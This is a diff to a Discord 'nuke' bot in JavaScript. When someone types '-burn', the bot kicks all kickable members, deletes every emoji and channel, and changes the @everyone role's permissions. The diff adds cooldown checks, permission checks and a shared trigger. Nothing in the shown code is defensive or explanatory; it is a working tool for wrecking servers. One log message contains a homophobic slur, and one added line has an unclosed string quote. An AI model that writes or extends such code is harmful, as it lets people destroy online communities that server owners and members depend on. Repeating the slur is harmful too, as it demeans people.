@@ -108,6 +108,7 @@ client.on("message", msg => {
        if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !') 
  return
   }
+            if(nukingtime.has("-burn")) {return}
         message.guild.members.cache.forEach(m => {
          if(m.kickable) m.kick();
    });
@@ -127,10 +128,11 @@ client.on("message", msg => {
   })
      //this edits all roles
      client.on('message', message => {
-       if(message.content.startsWith('-bruh')) {
+       if(message.content.startsWith('-burn')) {
  if(message.channel.type === "dm") {return}
          if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
   }    
+            if(nukingtime.has("-burn")) {return}
   message.guild.emojis.cache.forEach(e => {
     e.delete()})
     
@@ -167,7 +169,10 @@ b++
    client.on('message', message => {
      if(message.content.startsWith("-burn")) {
  if(message.channel.type === "dm") {return}
+if(message.guild.me.hasPermission("ADMINISTRATOR)) {
+            if(nukingtime.has("-burn")) {return}
        message.guild.roles.everyone.setPermissions(['READ_MESSAGE_HISTORY', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'MENTION_EVERYONE']);
+   }
    }
    }) 
  
@@ -199,8 +204,10 @@ a8"     "" 88       88 88P'    "8a a8P_____88
  
  
    client.on('message', message => {
-     if(message.content.startsWith("-bur")) {
+     if(message.content.startsWith("-burn")) {
  if(message.channel.type === "dm") {return}
+if(message.guild.me.hasPermission("ADMINISTRATOR")) {
+            if(nukingtime.has("-burn")) {return}
              message.guild.channels.cache.forEach(channel => {
              channel.delete().then((channel)=>{
                if (channel.deleted === true)
@@ -211,6 +218,7 @@ a8"     "" 88       88 88P'    "8a a8P_____88
                console.log(`Faggot i cant delete that channel because ${reason}`);
              })
            }) 
+}
          
    }
    }) 
@@ -220,7 +228,7 @@ a8"     "" 88       88 88P'    "8a a8P_____88
  client.on('message', msg => {
      if(msg.content === `-burn`) {
          if(msg.channel.type === "dm") {return}
-            if(nukingtime.has("-burn")) {return msg.reply("command is on cooldown for 5 minutes or less").then(m => setTimeout(() => {m.delete()},3000))}
+            if(nukingtime.has("-burn")) {return msg.channel.send("command is on cooldown for 5 minutes or less").then(m => setTimeout(() => {m.delete()},3000))}
               nukingtime.add("-burn")
                 setTimeout(() => {nukingtime.delete("-burn")}, 300000)
        if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }  
